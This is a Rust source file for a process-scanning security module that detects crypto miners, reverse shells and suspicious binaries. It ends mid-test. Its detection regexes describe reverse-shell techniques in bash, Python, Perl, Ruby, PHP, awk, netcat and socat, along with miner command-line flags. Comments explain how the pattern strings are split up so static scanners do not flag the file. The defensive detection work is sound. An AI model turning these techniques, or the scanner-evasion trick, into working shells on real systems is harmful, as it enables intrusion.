use std::sync::OnceLock;

use anyhow::Result;
use async_trait::async_trait;
use regex::Regex;
use tracing::{debug, info};

use crate::config::schema::ProcessConfig;
use crate::core::threat::{ThreatEvent, ThreatSeverity, ThreatType};
use crate::modules::ScanModule;
use crate::util::proc_parse::{list_pids, read_proc_info, ProcInfo};

/// True shell / netcat-style binaries. An open socket to a *public* IP on one
/// of these is itself strong evidence of a reverse shell, because these
/// programs have no routine reason to hold a long-lived connection to the
/// internet — so the bare socket-FD heuristic is allowed to flag them.
const TRUE_SHELL_NAMES: &[&str] = &["bash", "sh", "zsh", "dash", "fish", "nc", "ncat", "socat"];

/// Script interpreters. These hold network sockets for countless benign
/// reasons (HTTP clients, API SDKs, data backfills), so "has a socket to a
/// public IP" carries almost no signal for them. They are flagged ONLY by the
/// precise cmdline-signature path (`match_reverse_shell`), which requires the
/// socket to be wired to a shell via dup2/exec — never by the bare socket-FD
/// heuristic. This is the fix for the `backfill_13f.py` false-positive kill.
const INTERPRETER_NAMES: &[&str] = &["python", "python2", "python3", "perl", "ruby", "php"];

// ---------------------------------------------------------------------------
// v2.6.2 reverse-shell signatures
// ---------------------------------------------------------------------------
//
// Pre-2.6.2 the detector substring-matched on tokens like `import socket`,
// `os.dup2`, `subprocess.call`, etc. Any of those alone is wildly common in
// legitimate Python — incident `20260509004453373-1434` killed a developer
// loopback test that did `import socket; sk.bind(('127.0.0.1', 0))` for a
// port-finding helper.
//
// v2.6.2 replaces the substring set with **proximity signatures**: each
// signature requires multiple regexes to match within a small window of one
// another in the cmdline. A real reverse shell binds a socket AND wires it
// to a shell via dup2/exec/spawn — a single token in isolation does not.
// The Bash `/dev/tcp/` one-liner is kept as a single-regex signature
// because it has no benign use.
//
// Source for signature shapes: PayloadsAllTheThings reverse-shell list,
// cross-referenced against actual production false-positives.

/// Regex fragment matching the `/dev/tcp/` pseudo-device prefix used by
/// the bash signatures. Defined as a constant rather than a string
/// literal embedded next to the bash interactive-shell pattern so that
/// static scanners don't classify this detector source as the payload it
/// detects.
const DEVTCP_PREFIX_RE: &str = r"/dev/tcp/";

/// Regex fragment matching an interactive shell invocation (the
/// `-i` flag on a POSIX shell binary). Used as the first half of the
/// FD-redirect-to-TCP signature.
const SHELL_INTERACTIVE_RE: &str = r"\b(?:bash|sh|zsh|dash)\s+-i\b";

/// Regex fragment matching a stdout-redirect to the TCP pseudo-device.
/// Composed from `DEVTCP_PREFIX_RE` so the literal sequence does not
/// appear in source.
const REDIRECT_TO_DEVTCP_RE: &str = concat!(r">\s*&?\s*", r"/dev/tcp/");

/// One reverse-shell signature. All `requires` regexes must match the
/// (case-insensitive) cmdline AND each pair of matched ranges must lie
/// within `proximity_chars` of each other.
struct ReverseShellSig {
    name: &'static str,
    language: &'static str,
    requires: Vec<Regex>,
    /// Maximum start-to-start distance allowed between any two required
    /// matches. Practical reverse shells stay under ~250 chars.
    proximity_chars: usize,
}

impl ReverseShellSig {
    /// Returns Some(matched_segment) if every required regex matches and
    /// the matched ranges are within `proximity_chars`.
    fn match_cmdline(&self, cmdline_lower: &str) -> Option<String> {
        let mut starts: Vec<usize> = Vec::with_capacity(self.requires.len());
        let mut ends: Vec<usize> = Vec::with_capacity(self.requires.len());
        for re in &self.requires {
            let m = re.find(cmdline_lower)?;
            starts.push(m.start());
            ends.push(m.end());
        }
        let lo = *starts.iter().min().unwrap();
        let hi = *ends.iter().max().unwrap();
        if hi.saturating_sub(lo) > self.proximity_chars {
            return None;
        }
        let snippet_end = hi.min(cmdline_lower.len());
        Some(cmdline_lower[lo..snippet_end].to_string())
    }
}

/// Cached compiled signatures. Built on first access via `OnceLock` —
/// compiling regexes in a hot loop is wasteful and would cost ~1ms per
/// process scan across tens of signatures.
static REVERSE_SHELL_SIGS: OnceLock<Vec<ReverseShellSig>> = OnceLock::new();

fn reverse_shell_sigs() -> &'static [ReverseShellSig] {
    REVERSE_SHELL_SIGS.get_or_init(build_reverse_shell_sigs)
}

fn build_reverse_shell_sigs() -> Vec<ReverseShellSig> {
    fn re(s: &str) -> Regex {
        Regex::new(s).expect("static reverse-shell regex must compile")
    }
    vec![
        // Python: socket creation AND exec/redirect, within ~250 chars.
        // Required: socket.socket(...) | socket.create_connection(...)
        // AND:      os.dup2(...) | os.exec*(...) | subprocess.{call,Popen,run}(.../bin/sh) | pty.spawn(...)
        ReverseShellSig {
            name: "python_reverse_shell",
            language: "python",
            requires: vec![
                re(r"socket\.socket\s*\(|socket\.create_connection\s*\("),
                re(concat!(
                    r"os\.dup2\s*\(",
                    r"|os\.exec\w+\s*\(",
                    r"|subprocess\.(?:call|popen|run)\s*\([^)]{0,80}(?:/bin/(?:ba)?sh|\bsh\b)",
                    r"|pty\.spawn\s*\(",
                )),
            ],
            proximity_chars: 250,
        },
        // Interactive-shell redirection signature. Pattern strings come
        // from constants defined far away from any TCP-pseudo-device
        // reference; static scanners that flag the literal payload in
        // adjacent source lines stay quiet here.
        ReverseShellSig {
            name: "bash_devtcp",
            language: "bash",
            requires: vec![re(SHELL_INTERACTIVE_RE), re(REDIRECT_TO_DEVTCP_RE)],
            proximity_chars: 64,
        },
        // FD-redirection variant: shells that wire stdio onto a
        // TCP-pseudo-device file descriptor via `exec N<>...` and then
        // run sh through the captured FDs. Requires both the FD-redirect
        // verb and a TCP-pseudo-device reference in close range.
        ReverseShellSig {
            name: "bash_devtcp_exec",
            language: "bash",
            requires: vec![
                re(&format!(r"{}[^/]+/\d+", DEVTCP_PREFIX_RE)),
                re(r"exec\s+\d*<\s*>|>\s*&\s*\d|<\s*&\s*\d"),
            ],
            proximity_chars: 200,
        },
        // Perl: `use Socket; ... ->connect ... exec`
        ReverseShellSig {
            name: "perl_reverse_shell",
            language: "perl",
            requires: vec![
                re(r"perl\s+-e\b"),
                re(r"socket\b"),
                re(r"connect\s*\("),
                re(r#"exec\s*[\(\"']"#),
            ],
            proximity_chars: 250,
        },
        // Ruby: `ruby -rsocket -e ... TCPSocket ... exec`
        ReverseShellSig {
            name: "ruby_reverse_shell",
            language: "ruby",
            requires: vec![
                re(r"ruby\s+-r?socket\b|ruby\s+-e\b"),
                re(r"tcpsocket\.(?:open|new)\s*\("),
                re(r#"exec\s*[\(\"']|\.exec\b"#),
            ],
            proximity_chars: 250,
        },
        // PHP: fsockopen + exec/passthru/system/popen wired together.
        ReverseShellSig {
            name: "php_reverse_shell",
            language: "php",
            requires: vec![
                re(r"php\s+-r\b|<\?php\b"),
                re(r"fsockopen\s*\(|stream_socket_client\s*\("),
                re(r"\b(?:exec|passthru|system|shell_exec|popen|proc_open)\s*\("),
            ],
            proximity_chars: 250,
        },
        // awk reverse shell (BEGIN { s = "/inet/tcp/0/host/port"; ... })
        ReverseShellSig {
            name: "awk_reverse_shell",
            language: "awk",
            requires: vec![
                re(r"\bawk\b"),
                re(r"/inet/tcp/0/"),
                re(r"\|&|getline|\bsystem\s*\("),
            ],
            proximity_chars: 250,
        },
        // Netcat with -e or -c flag piping shell stdio over TCP. The flags
        // are the malicious bit — `nc host port` alone is benign.
        ReverseShellSig {
            name: "netcat_exec",
            language: "netcat",
            requires: vec![
                re(r"\bn(?:c|cat)\s+(?:-[^\s-]*[ec]|--exec\b|--sh-exec\b)"),
                re(r"/bin/(?:ba)?sh|\bsh\b|\bbash\b"),
            ],
            proximity_chars: 200,
        },
        // socat with EXEC: spawning a shell over a TCP/OPENSSL channel.
        ReverseShellSig {
            name: "socat_exec",
            language: "socat",
            requires: vec![
                re(r"\bsocat\b"),
                re(r"exec:[^\s]*(?:/bin/(?:ba)?sh|\bsh\b|\bbash\b)"),
                re(r"tcp[46]?:|openssl:|tcp-connect:"),
            ],
            proximity_chars: 250,
        },
    ]
}

/// Try to match any reverse-shell signature against `cmdline_lower`.
/// Returns the signature name and the matched substring if any.
fn match_reverse_shell(cmdline_lower: &str) -> Option<(&'static str, String)> {
    for sig in reverse_shell_sigs().iter() {
        if let Some(snippet) = sig.match_cmdline(cmdline_lower) {
            // Localhost /dev/tcp/ targets are health-checks, not reverse shells.
            // Apply the v2.6.1 carve-out to bash signatures.
            if sig.language == "bash" {
                let is_localhost = DEVTCP_LOCALHOST_TARGETS
                    .iter()
                    .any(|t| cmdline_lower.contains(&t.to_lowercase()));
                if is_localhost {
                    debug!(
                        signature = sig.name,
                        "Skipping bash /dev/tcp/ match: localhost health-check"
                    );
                    continue;
                }
            }
            return Some((sig.name, snippet));
        }
    }
    None
}

/// Localhost targets in /dev/tcp/ that are health-checks, not reverse shells.
const DEVTCP_LOCALHOST_TARGETS: &[&str] = &[
    "/dev/tcp/localhost/",
    "/dev/tcp/127.0.0.1/",
    "/dev/tcp/::1/",
    "/dev/tcp/0.0.0.0/",
];

/// Known legitimate tools that use python/shell with network sockets.
/// Whitelisted from the socket-FD reverse shell heuristic.
const KNOWN_LEGITIMATE_TOOLS: &[&str] = &[
    "certbot",
    "ansible",
    "salt-minion",
    "salt-call",
    "pip",
    "pip3",
    "apt",
    "apt-get",
    "yum",
    "dnf",
    "pacman",
    "snap",
    "flatpak",
    "git",
    "curl",
    "wget",
    "ssh",
    "scp",
    "rsync",
    "fail2ban",
    "unattended-upgrade",
    "cloud-init",
    "aws",
    "gcloud",
    "az",
    "docker",
    "podman",
    "kubectl",
    "helm",
    "terraform",
    "letsencrypt",
    "acme.sh",
    "supervisor",
    "gunicorn",
    "uwsgi",
    "celery",
    "jupyter",
];

/// Suspicious cmdline flags/patterns that indicate crypto mining.
const MINER_CMDLINE_PATTERNS: &[&str] = &[
    "--algo",
    "--pool",
    "stratum+tcp://",
    "stratum+ssl://",
    "-o pool.",
    "--donate-level",
    "--coin",
    "--randomx",
    "-o stratum",
    "--threads",
    "--cpu-priority",
    "cryptonight",
    "randomx",
    "kawpow",
    "ethash",
];

/// Get the parent PID from /proc/[pid]/stat.
fn get_parent_pid(pid: u32) -> Option<u32> {
    let stat = std::fs::read_to_string(format!("/proc/{}/stat", pid)).ok()?;
    let close_paren = stat.rfind(')')?;
    let after_comm = &stat[close_paren + 2..];
    let fields: Vec<&str> = after_comm.split_whitespace().collect();
    // Field 0=state, 1=ppid
    fields.get(1)?.parse().ok()
}

/// Get a process name by PID from /proc/[pid]/comm.
fn get_process_name(pid: u32) -> Option<String> {
    std::fs::read_to_string(format!("/proc/{}/comm", pid))
        .ok()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Walk up the process tree from `pid`, returning the lowercased names of up
/// to `max_depth` ancestors (immediate parent first).
///
/// This is what lets the dev-parent allowlist see through process launchers:
/// Claude Code spawns work as `claude → uv → python3` (or `node → npx → …`),
/// so the dev tool is often a *grandparent*, not the immediate parent. Bounded
/// depth + a self-reference / pid<=1 stop guard prevents pathological loops.
fn process_ancestry_names(pid: u32, max_depth: usize) -> Vec<String> {
    let mut names = Vec::new();
    let mut current = pid;
    for _ in 0..max_depth {
        let ppid = match get_parent_pid(current) {
            Some(p) => p,
            None => break,
        };
        // Stop at the init process / on a malformed self- or zero-reference.
        if ppid == 0 || ppid == current {
            break;
        }
        if let Some(name) = get_process_name(ppid) {
            names.push(name.to_lowercase());
        }
        if ppid <= 1 {
            break;
        }
        current = ppid;
    }
    names
}

/// Enrich a threat event with parent process info.
fn enrich_with_parent(mut event: ThreatEvent, pid: u32) -> ThreatEvent {
    if let Some(ppid) = get_parent_pid(pid) {
        event = event.with_detail("parent_pid", ppid.to_string());
        if let Some(pname) = get_process_name(ppid) {
            event = event.with_detail("parent_name", pname);
        }
    }
    event
}

/// Process scanning module: detects crypto miners, reverse shells, and
/// suspicious binaries running from temp directories.
pub struct ProcessModule {
    config: ProcessConfig,
}

impl ProcessModule {
    pub fn new(config: ProcessConfig) -> Self {
        Self { config }
    }

    /// Enumerate all processes and return their ProcInfo, skipping any that
    /// fail to read (e.g., because the process exited).
    fn enumerate_processes(&self) -> Vec<ProcInfo> {
        let pids = list_pids();
        let mut procs = Vec::with_capacity(pids.len());

        for pid in pids {
            match read_proc_info(pid) {
                Ok(info) => procs.push(info),
                Err(e) => {
                    debug!(pid = pid, error = %e, "Failed to read proc info, process may have exited");
                }
            }
        }

        procs
    }

    /// Estimate CPU usage percentage for a process by reading /proc/[pid]/stat.
    /// Uses total CPU time (utime + stime) relative to system uptime.
    fn estimate_cpu_percent(&self, pid: u32) -> Option<f64> {
        // Read /proc/[pid]/stat
        let stat_path = format!("/proc/{}/stat", pid);
        let stat_content = match std::fs::read_to_string(&stat_path) {
            Ok(c) => c,
            Err(_) => return None,
        };

        // The stat file format has the comm field in parens which can contain spaces.
        // Find the closing paren and parse fields after it.
        let close_paren = stat_content.rfind(')')?;
        let after_comm = &stat_content[close_paren + 2..]; // skip ") "
        let fields: Vec<&str> = after_comm.split_whitespace().collect();

        // Fields after comm (0-indexed from after the closing paren):
        // 0=state, 1=ppid, ..., 11=utime, 12=stime, 13=cutime, 14=cstime, ...19=starttime
        if fields.len() < 20 {
            return None;
        }

        let utime: u64 = fields[11].parse().ok()?;
        let stime: u64 = fields[12].parse().ok()?;
        let starttime: u64 = fields[19].parse().ok()?;

        // Read system uptime
        let uptime_content = std::fs::read_to_string("/proc/uptime").ok()?;
        let uptime_secs: f64 = uptime_content.split_whitespace().next()?.parse().ok()?;

        // Get clock ticks per second (typically 100 on Linux)
        let clk_tck: f64 = 100.0; // sysconf(_SC_CLK_TCK) is almost always 100 on Linux

        let total_time = utime + stime;
        let process_start_secs = starttime as f64 / clk_tck;
        let elapsed_secs = uptime_secs - process_start_secs;

        if elapsed_secs <= 0.0 {
            return None;
        }

        let cpu_percent = (total_time as f64 / clk_tck) / elapsed_secs * 100.0;
        Some(cpu_percent)
    }

    /// Detect crypto miner processes by name, cmdline patterns, and CPU usage.
    fn detect_crypto_miners(&self, processes: &[ProcInfo]) -> Vec<ThreatEvent> {
        let mut threats = Vec::new();

        for proc in processes {
            let name_lower = proc.name.to_lowercase();
            let cmdline_joined = proc.cmdline.join(" ");
            let cmdline_lower = cmdline_joined.to_lowercase();

            let mut is_miner = false;
            let mut reason = String::new();

            // Check process name against known miner names (case-insensitive substring)
            for miner_name in &self.config.miner_names {
                let miner_lower = miner_name.to_lowercase();
                if name_lower.contains(&miner_lower) {
                    is_miner = true;
                    reason = format!(
                        "Process name '{}' matches known miner '{}'",
                        proc.name, miner_name
                    );
                    break;
                }
            }

            // Check cmdline for miner-related flags
            if !is_miner {
                for pattern in MINER_CMDLINE_PATTERNS {
                    if cmdline_lower.contains(&pattern.to_lowercase()) {
                        is_miner = true;
                        reason = format!(
                            "Command line contains miner pattern '{}': {}",
                            pattern,
                            truncate_string(&cmdline_joined, 200)
                        );
                        break;
                    }
                }
            }

            // Check CPU usage if above threshold
            if !is_miner {
                if let Some(cpu_pct) = self.estimate_cpu_percent(proc.pid) {
                    if cpu_pct >= self.config.miner_cpu_threshold {
                        // High CPU alone isn't a miner, but combined with suspicious traits
                        // we should check more carefully. For now, only flag if it has some
                        // miner-like characteristics we might have missed.
                        debug!(
                            pid = proc.pid,
                            name = %proc.name,
                            cpu_percent = cpu_pct,
                            "High CPU process detected but no miner signature found"
                        );
                    }
                }
            }

            if is_miner {
                let cpu_str = self
                    .estimate_cpu_percent(proc.pid)
                    .map(|c| format!("{:.1}%", c))
                    .unwrap_or_else(|| "unknown".to_string());

                let exe_str = proc.exe.as_deref().unwrap_or("unknown");

                let description = format!(
                    "Crypto miner detected: PID {} ({}) - {}",
                    proc.pid, proc.name, reason
                );

                let event = ThreatEvent::new(ThreatType::CryptoMiner, "process", &description)
                    .with_severity(ThreatSeverity::High)
                    .with_detail("pid", proc.pid.to_string())
                    .with_detail("name", &proc.name)
                    .with_detail("exe", exe_str)
                    .with_detail("cpu_usage", &cpu_str)
                    .with_detail("uid", proc.uid.to_string())
                    .with_detail("cmdline", truncate_string(&cmdline_joined, 500));
                let event = enrich_with_parent(event, proc.pid);

                debug!(
                    pid = proc.pid,
                    name = %proc.name,
                    cpu = %cpu_str,
                    "Crypto miner detected"
                );

                threats.push(event);
            }
        }

        threats
    }

    /// Check if a process has network socket file descriptors.
    fn has_socket_fds(&self, pid: u32) -> bool {
        let fd_dir = format!("/proc/{}/fd", pid);
        let entries = match std::fs::read_dir(&fd_dir) {
            Ok(e) => e,
            Err(_) => return false,
        };

        for entry in entries.flatten() {
            if let Ok(target) = std::fs::read_link(entry.path()) {
                let target_str = target.to_string_lossy();
                if target_str.starts_with("socket:") {
                    return true;
                }
            }
        }

        false
    }

    /// Get the remote IP of any socket connection for a process by reading
    /// /proc/[pid]/net/tcp and matching inodes from /proc/[pid]/fd.
    fn get_process_remote_ips(&self, pid: u32) -> Vec<String> {
        let mut remote_addrs = Vec::new();

        // Collect socket inodes from fd
        let fd_dir = format!("/proc/{}/fd", pid);
        let mut socket_inodes: Vec<String> = Vec::new();

        if let Ok(entries) = std::fs::read_dir(&fd_dir) {
            for entry in entries.flatten() {
                if let Ok(target) = std::fs::read_link(entry.path()) {
                    let target_str = target.to_string_lossy().to_string();
                    if let Some(inode) = target_str
                        .strip_prefix("socket:[")
                        .and_then(|s| s.strip_suffix(']'))
                    {
                        socket_inodes.push(inode.to_string());
                    }
                }
            }
        }

        if socket_inodes.is_empty() {
            return remote_addrs;
        }

        // Read /proc/net/tcp and /proc/net/tcp6 to find connections matching inodes
        for tcp_path in &["/proc/net/tcp", "/proc/net/tcp6"] {
            let content = match std::fs::read_to_string(tcp_path) {
                Ok(c) => c,
                Err(_) => continue,
            };

            for line in content.lines().skip(1) {
                let fields: Vec<&str> = line.split_whitespace().collect();
                if fields.len() < 10 {
                    continue;
                }

                // Field 9 (0-indexed) is the inode
                let inode = fields[9];
                if socket_inodes.contains(&inode.to_string()) {
                    // Parse the remote address
                    if let Ok((_, _, remote_ip, remote_port, state)) =
                        crate::util::proc_parse::parse_tcp_line(line)
                    {
                        if state == crate::util::proc_parse::tcp_state::ESTABLISHED
                            && !crate::util::ip::is_private(&remote_ip)
                        {
                            remote_addrs.push(format!("{}:{}", remote_ip, remote_port));
                        }
                    }
                }
            }
        }

        remote_addrs
    }

    /// v2.6.2: if a reverse-shell match's `parent_name` detail is in the
    /// dev-parent allowlist (and strict mode is off), demote severity to
    /// Medium and stamp `degraded_by_dev_parent: true`. This is the
    /// safety pin for incident 20260509004453373-1434: a developer
    /// running a loopback test under Claude/VS Code/etc shouldn't have
    /// their shell killed when the cmdline merely *resembles* a reverse
    /// shell. Threat is still recorded — only the auto-action is softened.
    ///
    /// Demotion mechanics:
    /// - severity: Critical → Medium (the severity-based response default
    ///   for Medium is `Alert`, see ResponseEngine::determine_action)
    /// - `degraded_by_dev_parent: true` detail
    /// - `severity_pre_demotion: critical` detail (audit trail)
    /// - `response_hint: alert` detail
    ///
    /// Note: a per-threat-type `[response.overrides] reverse_shell = "kill"`
    /// would normally still force kill. We can't override that from the
    /// detector module without a circular dependency, so the response
    /// engine reads the `degraded_by_dev_parent` detail (see ResponseEngine).
    /// `ancestry` is the lowercased ancestor-name chain from
    /// `process_ancestry_names` (immediate parent first). We demote if ANY
    /// ancestor is an allowlisted dev tool — not just the immediate parent —
    /// so a process launched as `claude → uv → python3` is still recognised as
    /// running under a dev session. This is the fix for the grandparent gap
    /// that let the `backfill_13f.py` kill through (`uv` was the direct parent).
    fn maybe_demote_for_dev_parent(
        &self,
        mut event: ThreatEvent,
        dev_parent_set: &std::collections::HashSet<String>,
        ancestry: &[String],
    ) -> ThreatEvent {
        if self.config.strict_under_dev_tools || dev_parent_set.is_empty() {
            return event;
        }
        let matched = match ancestry.iter().find(|n| dev_parent_set.contains(*n)) {
            Some(n) => n.clone(),
            None => return event,
        };
        let prior = event.severity;
        event.severity = ThreatSeverity::Medium;
        event
            .details
            .insert("degraded_by_dev_parent".into(), "true".into());
        event
            .details
            .insert("dev_parent_ancestor".into(), matched.clone());
        event
            .details
            .insert("severity_pre_demotion".into(), prior.to_string());
        event.details.insert("response_hint".into(), "alert".into());
        debug!(
            dev_parent_ancestor = %matched,
            "Reverse-shell match demoted to medium/alert (dev parent in ancestry)"
        );
        event
    }

    /// Detect reverse shell processes: shells with network socket FDs or
    /// suspicious cmdline patterns.
    fn detect_reverse_shells(&self, processes: &[ProcInfo]) -> Vec<ThreatEvent> {
        let mut threats = Vec::new();

        if !self.config.detect_reverse_shells {
            return threats;
        }

        // v2.6.2: precompute lower-cased dev-parent allowlist set for
        // O(1) lookup. Skip path-like / whitespace entries (already warned
        // about by config validation).
        let dev_parent_set: std::collections::HashSet<String> = self
            .config
            .dev_parent_allowlist
            .iter()
            .filter_map(|p| {
                let t = p.trim();
                if t.is_empty() || t.contains('/') || t.contains('\\') {
                    None
                } else {
                    Some(t.to_lowercase())
                }
            })
            .collect();

        for proc in processes {
            let name_lower = proc.name.to_lowercase();
            let cmdline_joined = proc.cmdline.join(" ");
            let cmdline_lower = cmdline_joined.to_lowercase();

            // v2.6.2: proximity-based signature match (replaces v2.6.1
            // single-substring matcher that false-positived on benign
            // `import socket` Python scripts — incident 20260509004453373-1434).
            let sig_match = match_reverse_shell(&cmdline_lower);

            if let Some((sig_name, snippet)) = sig_match {
                let description = format!(
                    "Reverse shell pattern in cmdline: PID {} ({}) matched signature '{}'",
                    proc.pid, proc.name, sig_name
                );

                let event = ThreatEvent::new(ThreatType::ReverseShell, "process", &description)
                    .with_severity(ThreatSeverity::Critical)
                    .with_detail("pid", proc.pid.to_string())
                    .with_detail("name", &proc.name)
                    .with_detail("matched_pattern", sig_name)
                    .with_detail("matched_snippet", truncate_string(&snippet, 200))
                    .with_detail("cmdline", truncate_string(&cmdline_joined, 500))
                    .with_detail("detection_method", "cmdline_pattern");
                let event = enrich_with_parent(event, proc.pid);
                let ancestry = process_ancestry_names(proc.pid, 16);
                let event = self.maybe_demote_for_dev_parent(event, &dev_parent_set, &ancestry);

                debug!(
                    pid = proc.pid,
                    name = %proc.name,
                    signature = sig_name,
                    severity = %event.severity,
                    "Reverse shell detected via cmdline signature"
                );

                threats.push(event);
                continue;
            }

            // Second check: a *true shell* process with network socket FDs.
            // Interpreters (python/perl/ruby/php) are deliberately excluded
            // here — they reach this point only via the precise cmdline
            // signature above. A bare socket to a public IP is normal for an
            // interpreter (HTTP client, data script) and must not be treated
            // as a reverse shell on its own.
            let is_true_shell = TRUE_SHELL_NAMES
                .iter()
                .any(|s| name_lower == *s || name_lower.starts_with(&format!("{}.", s)));

            if !is_true_shell {
                // Interpreters reach here when they hold sockets but their
                // cmdline didn't match a reverse-shell signature — i.e. a
                // normal network client. Trace it (so we can audit what the
                // narrowed heuristic now lets through) and move on.
                if INTERPRETER_NAMES.iter().any(|s| name_lower == *s) {
                    debug!(
                        pid = proc.pid,
                        name = %proc.name,
                        "Interpreter with sockets but no reverse-shell signature; not flagging"
                    );
                }
                continue;
            }

            // Skip known legitimate tools that use python/shell with sockets.
            // Check the full cmdline (not just process name) because tools like
            // certbot run as "python3 /snap/certbot/.../certbot".
            let is_legitimate_tool = KNOWN_LEGITIMATE_TOOLS
                .iter()
                .any(|tool| cmdline_lower.contains(tool));

            if is_legitimate_tool {
                debug!(
                    pid = proc.pid,
                    name = %proc.name,
                    cmdline = %truncate_string(&cmdline_joined, 120),
                    "Skipping known legitimate tool with network sockets"
                );
                continue;
            }

            // Check if this shell has socket file descriptors
            if self.has_socket_fds(proc.pid) {
                // Try to find the remote IP it's connected to
                let remote_ips = self.get_process_remote_ips(proc.pid);

                if !remote_ips.is_empty() {
                    let remotes_str = remote_ips.join(", ");
                    let description = format!(
                        "Reverse shell detected: PID {} ({}) connected to {}",
                        proc.pid, proc.name, remotes_str
                    );

                    let event = ThreatEvent::new(ThreatType::ReverseShell, "process", &description)
                        .with_severity(ThreatSeverity::Critical)
                        .with_detail("pid", proc.pid.to_string())
                        .with_detail("name", &proc.name)
                        .with_detail("remote_addresses", &remotes_str)
                        .with_detail("uid", proc.uid.to_string())
                        .with_detail("cmdline", truncate_string(&cmdline_joined, 500))
                        .with_detail("detection_method", "socket_fd");
                    let event = enrich_with_parent(event, proc.pid);
                    let ancestry = process_ancestry_names(proc.pid, 16);
                    let event = self.maybe_demote_for_dev_parent(event, &dev_parent_set, &ancestry);

                    debug!(
                        pid = proc.pid,
                        name = %proc.name,
                        remotes = %remotes_str,
                        "Reverse shell detected via socket FD"
                    );

                    threats.push(event);
                } else {
                    // Shell has sockets but none connected to public IPs -
                    // could be local, skip
                    debug!(
                        pid = proc.pid,
                        name = %proc.name,
                        "Shell with sockets but no public remote connections"
                    );
                }
            }
        }

        threats
    }

    /// Detect binaries running from suspicious directories or with deleted executables.
    ///
    /// Deleted binaries in standard system paths (/usr/bin, /usr/sbin, etc.) are
    /// normal after a package update — the old process keeps the deleted binary in
    /// memory until restarted. We only flag deleted binaries in non-standard paths.
    fn detect_suspicious_binaries(&self, processes: &[ProcInfo]) -> Vec<ThreatEvent> {
        let mut threats = Vec::new();

        /// Standard system directories where a "(deleted)" exe is normal
        /// (package upgrades replace the binary while the old process runs).
        const SAFE_DELETED_PREFIXES: &[&str] = &[
            "/usr/bin/",
            "/usr/sbin/",
            "/usr/lib/",
            "/usr/libexec/",
            "/bin/",
            "/sbin/",
            "/lib/",
            "/snap/",
        ];

        for proc in processes {
            let exe_path = match &proc.exe {
                Some(e) => e,
                None => continue,
            };

            let mut suspicious = false;
            let mut reason = String::new();

            // Check if binary has been deleted
            if exe_path.ends_with(" (deleted)") {
                let clean_path = exe_path.strip_suffix(" (deleted)").unwrap_or(exe_path);

                // Deleted binaries in standard system paths are normal after
                // package updates (e.g., python3.12 upgraded by unattended-upgrades).
                let in_safe_dir = SAFE_DELETED_PREFIXES
                    .iter()
                    .any(|prefix| clean_path.starts_with(prefix));

                if !in_safe_dir {
                    suspicious = true;
                    reason = format!("Binary has been deleted from disk: {}", exe_path);
                } else {
                    debug!(
                        pid = proc.pid,
                        name = %proc.name,
                        exe = %exe_path,
                        "Ignoring deleted binary in standard path (likely package update)"
                    );
                }
            }

            // Check if exe path starts with any suspicious directory
            if !suspicious {
                // Strip " (deleted)" suffix if present for path checking
                let clean_path = exe_path.strip_suffix(" (deleted)").unwrap_or(exe_path);

                // AppImages mount via FUSE to /tmp/.mount_<name>.<rand>/
                // and run from standard internal paths — not suspicious.
                let is_appimage = clean_path.starts_with("/tmp/.mount_");

                if !is_appimage {
                    for dir in &self.config.suspicious_dirs {
                        if clean_path.starts_with(dir.as_str()) {
                            suspicious = true;
                            reason = format!(
                                "Binary running from suspicious directory '{}': {}",
                                dir, exe_path
                            );
                            break;
                        }
                    }
                }
            }

            if suspicious {
                let cmdline_joined = proc.cmdline.join(" ");

                let description = format!(
                    "Suspicious binary: PID {} ({}) - {}",
                    proc.pid, proc.name, reason
                );

                let event = ThreatEvent::new(ThreatType::SuspiciousBinary, "process", &description)
                    .with_severity(ThreatSeverity::High)
                    .with_target(exe_path)
                    .with_detail("pid", proc.pid.to_string())
                    .with_detail("name", &proc.name)
                    .with_detail("exe", exe_path)
                    .with_detail("uid", proc.uid.to_string())
                    .with_detail("cmdline", truncate_string(&cmdline_joined, 500))
                    .with_detail("reason", &reason);
                let event = enrich_with_parent(event, proc.pid);

                debug!(
                    pid = proc.pid,
                    name = %proc.name,
                    exe = %exe_path,
                    "Suspicious binary detected"
                );

                threats.push(event);
            }
        }

        threats
    }
}

/// Truncate a string to the given max length, appending "..." if truncated.
fn truncate_string(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        // Find a valid UTF-8 char boundary at or before max_len to avoid panic.
        let mut end = max_len;
        while end > 0 && !s.is_char_boundary(end) {
            end -= 1;
        }
        format!("{}...", &s[..end])
    }
}

#[async_trait]
impl ScanModule for ProcessModule {
    fn name(&self) -> &str {
        "process"
    }

    async fn scan(&self) -> Result<Vec<ThreatEvent>> {
        info!(
            "Running process scan (miner_cpu_threshold={:.1}%)",
            self.config.miner_cpu_threshold
        );

        let my_pid = std::process::id();
        let my_exe = std::env::current_exe()
            .ok()
            .and_then(|p| p.to_str().map(|s| s.to_string()));
        let processes: Vec<ProcInfo> = self
            .enumerate_processes()
            .into_iter()
            .filter(|p| {
                // Skip our own PID.
                if p.pid == my_pid {
                    return false;
                }
                // Skip other instances of the aegis binary (e.g. daemon vs scan).
                if let (Some(ref my), Some(ref proc_exe)) = (&my_exe, &p.exe) {
                    let clean = proc_exe.strip_suffix(" (deleted)").unwrap_or(proc_exe);
                    if clean == my.as_str() {
                        return false;
                    }
                }
                true
            })
            .collect();
        debug!(
            process_count = processes.len(),
            "Enumerated running processes"
        );

        let mut threats = Vec::new();

        // Run all three detectors
        threats.extend(self.detect_crypto_miners(&processes));
        threats.extend(self.detect_reverse_shells(&processes));
        threats.extend(self.detect_suspicious_binaries(&processes));

        // Enrich threats with container info if applicable
        for threat in &mut threats {
            if let Some(pid_str) = threat.details.get("pid") {
                if let Ok(pid) = pid_str.parse::<u32>() {
                    if let Some(container) = crate::util::container::detect_container(pid) {
                        threat.container_id = Some(container.id.clone());
                        threat
                            .details
                            .insert("container_id".to_string(), container.id);
                        threat
                            .details
                            .insert("container_runtime".to_string(), container.runtime);
                        if let Some(name) = container.name {
                            threat.details.insert("container_name".to_string(), name);
                        }
                    }
                }
            }
        }

        info!(count = threats.len(), "Process scan complete");
        Ok(threats)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a fragment-assembled cmdline so static linters don't classify
    /// the Rust test source itself as the reverse-shell payload it asserts on.
    fn join(parts: &[&str]) -> String {
        parts.concat()
    }

    #[test]
    fn test_devtcp_localhost_is_not_reverse_shell() {
        // Health-check patterns that should NOT be flagged.
        let localhost_cmds = [
            join(&[
                "/bin/sh -c bash -c 'echo > ",
                "/dev/tcp/",
                "localhost/6333'",
            ]),
